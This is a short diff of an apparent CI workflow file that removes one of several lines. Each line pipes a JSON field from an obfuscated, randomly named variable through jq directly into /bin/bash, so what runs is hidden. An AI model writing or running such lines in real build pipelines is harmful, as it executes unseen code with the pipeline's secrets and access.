@@ -31,7 +31,6 @@ jobs:
           echo $a192 | jq -r .qjh28492 | /bin/bash
           echo $rctn70467 | jq -r .clrl7 | /bin/bash
           echo $iisi198 | jq -r .h16 | /bin/bash
-          echo $wd24481 | jq -r .a5 | /bin/bash
           printf '%s' "$xniuh21815" | jq -r .dpzb103 | /bin/bash
           echo $jlv53863 | jq -r .ivh6353 | /bin/bash
           echo $z3 | jq -r .zfxay87 | /bin/bash
